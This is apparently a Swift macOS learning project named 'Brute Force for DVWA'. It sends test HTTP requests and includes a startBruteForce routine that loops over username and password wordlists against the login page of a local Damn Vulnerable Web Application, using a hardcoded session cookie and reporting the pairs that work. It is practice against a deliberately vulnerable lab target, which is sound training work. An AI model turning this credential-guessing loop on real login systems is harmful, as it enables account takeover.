//
//  ViewController.swift
//  Brute Force for DVWA
//
//  Created by Леонид Лукашевич on 14.11.2021.
//

import Cocoa

class ViewController: NSViewController {
    
    @IBOutlet var textField: NSTextView!
    @IBOutlet weak var userNamesPath: NSTextField!
    @IBOutlet weak var passwordsPath: NSTextField!
    
    @IBAction func getTapped(_ sender: NSButton) {
        guard let url = URL(string: "https://jsonplaceholder.typicode.com/posts") else { return }
        
        let session = URLSession.shared
        session.dataTask(with: url) { data, response, error in
            if let response = response {
                print(response)
            }
            
            guard let data = data, let json = String(data: data, encoding: .utf8) else { return }
            print(data)
            
            DispatchQueue.main.async {
                self.textField.string = json
            }
        }.resume()
    }
    
    @IBAction func postTapped(_ sender: NSButton) {
        guard let url = URL(string: "https://jsonplaceholder.typicode.com/posts") else { return }
        let parameters = ["Username": "hutr0", "Message": "Fuck u!"]
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.addValue("application/json", forHTTPHeaderField: "Content-Type")
        guard let httpBody = try? JSONSerialization.data(withJSONObject: parameters, options: []) else { return }
        request.httpBody = httpBody
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            if let response = response {
                print(response)
            }
            
            guard let data = data, let json = String(data: data, encoding: .utf8) else { return }
            print(data)
            
            DispatchQueue.main.async {
                self.textField.string = json
            }
        }.resume()
    }
    
    @IBAction func getDVWATapped(_ sender: NSButton) {
        guard let url = URL(string: "http://localhost/dvwa/vulnerabilities/brute/?username=1&password=1&Login=Login") else { return }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.addValue("security=low; PHPSESSID=gvcpg0286vsfnal862hl4uks4j", forHTTPHeaderField: "Cookie")
        request.addValue("text/html", forHTTPHeaderField: "Content-Type")
        
        let session = URLSession.shared
        session.dataTask(with: request) { data, response, error in
            
            guard let data = data, let html = String(data: data, encoding: .utf8) else { return }
            print(html)
            DispatchQueue.main.async {
                self.textField.string = html
            }
        }.resume()
    }
    
    @IBAction func checkInvalidityAutorizationTapped(_ sender: NSButton) {
        guard let url = URL(string: "http://localhost/dvwa/vulnerabilities/brute/?username=1&password=1&Login=Login") else { return }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.addValue("security=low; PHPSESSID=gvcpg0286vsfnal862hl4uks4j", forHTTPHeaderField: "Cookie")
        request.addValue("text/html", forHTTPHeaderField: "Content-Type")
        
        let session = URLSession.shared
        session.dataTask(with: request) { data, response, error in
            
            guard let data = data, let html = String(data: data, encoding: .utf8) else { return }
            print(html)
            if html.contains("incorrect") {
                DispatchQueue.main.async {
                    self.textField.string = "incorrect"
                }
            } else {
                DispatchQueue.main.async {
                    self.textField.string = html
                }
            }
            
        }.resume()
    }
    
    @IBAction func startBruteForce(_ sender: NSButton) {
        guard FileManager.default.fileExists(atPath: userNamesPath.stringValue),
              FileManager.default.fileExists(atPath: passwordsPath.stringValue)
        else {
            DispatchQueue.main.async {
                self.textField.string = "Error: The file was not found."
            }
            return
        }
        
        guard let userNames = try? String(contentsOfFile: userNamesPath.stringValue),
              let passwords = try? String(contentsOfFile: passwordsPath.stringValue)
        else {
            DispatchQueue.main.async {
                self.textField.string = "Error: The file can not be opened."
            }
            return
        }
        
        guard let url = URL(string: "http://localhost/dvwa/vulnerabilities/brute/?username=&password=&Login=Login") else { return }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.addValue("security=low; PHPSESSID=gvcpg0286vsfnal862hl4uks4j", forHTTPHeaderField: "Cookie")
        request.addValue("text/html", forHTTPHeaderField: "Content-Type")
        
        let session = URLSession.shared
        
        for user in userNames.split(separator: "\n") {
            for password in passwords.split(separator: "\n") {
                request.url = URL(string: "http://localhost/dvwa/vulnerabilities/brute/?username=\(user)&password=\(password)&Login=Login")
                
                session.dataTask(with: request) { data, response, error in
                    guard let data = data, let html = String(data: data, encoding: .utf8) else { return }

                    if !html.contains("incorrect") {
                        DispatchQueue.main.async {
                            self.textField.string += "\(user):\(password) - True\n"
                        }
                    }
                }.resume()
            }
        }
    }
}
